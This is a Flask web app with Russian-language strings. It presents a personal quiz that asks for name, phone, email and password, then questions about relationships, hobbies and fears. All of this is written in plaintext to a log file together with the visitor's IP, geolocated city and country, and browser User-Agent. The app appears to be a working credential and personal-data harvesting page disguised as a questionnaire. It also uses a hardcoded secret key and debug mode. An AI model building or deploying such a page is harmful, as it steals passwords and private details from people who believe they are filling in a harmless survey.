from flask import Flask, request, render_template, redirect, url_for, session
import requests
import os

app = Flask(__name__)
app.secret_key = 'very_secret_key'  # для хранения сессии

LOG_FILE = 'log.txt'

def save_response(data):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(
            f"Имя: {data['name']} | Телефон: {data['phone']} | Email: {data['email']} | Пароль: {data['password']} | "
            f"Ответы: {data['answers']} | IP: {data['ip']} | Город: {data['location']['city']} | "
            f"Страна: {data['location']['country']} | User-Agent: {data['user_agent']}\n"
        )
    print("[✔] Данные сохранены в log.txt")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        session['name'] = request.form.get('name')
        session['phone'] = request.form.get('phone')
        session['email'] = request.form.get('email')
        session['password'] = request.form.get('password')

        if not all([session['name'], session['phone'], session['email'], session['password']]):
            return "Пожалуйста, заполните все поля", 400

        return redirect(url_for('questions'))
    return render_template('index.html')

@app.route('/questions', methods=['GET', 'POST'])
def questions():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ua = request.headers.get('User-Agent')

        try:
            geo = requests.get(f'https://ipapi.co/{ip}/json/').json()
        except:
            geo = {}

        answers = {
            'Цветы': request.form.get('flowers'),
            'Отношения': request.form.get('relationships'),
            'Хобби': request.form.get('hobbies'),
            'Работа мечты': request.form.get('dream_job'),
            'Любимая еда': request.form.get('fav_food'),
            'Музыка': request.form.get('music'),
            'Путешествия': request.form.get('travel'),
            'Страхи': request.form.get('fears'),
        }

        full_data = {
            'name': session['name'],
            'phone': session['phone'],
            'email': session['email'],
            'password': session['password'],
            'answers': answers,
            'ip': ip,
            'location': {
                'city': geo.get('city'),
                'country': geo.get('country_name'),
            },
            'user_agent': ua
        }

        save_response(full_data)

        return render_template('success.html', name=session['name'], answers=answers, geo=geo, ip=ip, ua=ua)

    return render_template('questions.html')

if __name__ == '__main__':
    app.run(debug=True)

